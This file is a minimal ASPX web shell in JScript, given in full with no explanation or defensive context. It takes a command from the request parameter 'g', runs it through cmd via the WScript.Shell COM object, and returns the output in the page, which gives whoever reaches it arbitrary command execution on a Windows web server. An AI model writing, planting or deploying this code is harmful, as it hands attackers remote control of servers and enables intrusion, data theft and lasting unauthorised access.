<%@ Page Language="Jscript"%>
<%
var c=System.Web.HttpContext.Current;
var Request=c.Request;
var Response=c.Response;
var command = Request.Item['g'];
var r = GetObject("new:72C24DD5-D70A-438B-8A42-98424B88AFB8").Exec("cmd /c "+command);
var OutStream = r.StdOut;
var Str = "";
while (!OutStream.atEndOfStream) {

    Str = Str + OutStream.readAll();

    }
Response.Write("<pre>"+Str+"</pre>");
%>